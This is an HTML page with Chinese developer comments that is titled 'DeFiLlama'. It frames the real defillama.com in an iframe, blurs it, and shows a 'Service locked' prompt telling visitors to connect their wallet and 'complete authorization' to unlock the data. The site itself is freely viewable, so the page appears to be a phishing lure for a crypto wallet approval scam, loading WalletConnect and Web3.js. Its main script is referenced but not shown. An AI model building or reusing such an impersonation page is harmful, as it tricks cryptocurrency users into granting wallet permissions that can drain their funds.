<!DOCTYPE html>
<html lang="zh-Hant">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DeFiLlama</title>
    <!-- 引入 Font Awesome 庫用於錢包圖標 -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

    <!-- 🚨 修正 WalletConnect V2 相關 CDN 🚨 -->
    <!-- 1. 引入 WalletConnect V2 Provider (解決 Object is not a constructor 錯誤) -->
    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>

    <!-- 2. 引入 Web3.js 庫 (輔助 WalletConnect 連線和獲取地址) -->
    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>

    <link rel="stylesheet" href="./src/style.css">
</head>
<body>

    <header>
        <button id="connectButton" title="Connect wallet">
            <i class="fas fa-wallet"></i>
        </button>
    </header>

    <div id="contentContainer">
        <iframe id="coindeskFrame" src="https://defillama.com/" title="DeFiLlama"></iframe>

    </div>

    <div id="blurOverlay">
        <div id="overlayMessage">Connecting...</div>  <!-- 修改為英文 -->
    </div>

    <div id="lockedPrompt">
        <h2>🔒 Service locked</h2>
        <p>Please click the **wallet icon** in the upper right corner to connect your wallet and complete **authorization** to unlock the data.</p>
        <p style="font-size: 0.8em; margin-top: 20px;">
            (This prompt will disappear after successful authorization)
        </p>
    </div>


    <!-- 您的 main.js 必須在所有外部庫之後載入 -->
    <script src="./src/main.js"></script>

</body>
</html>
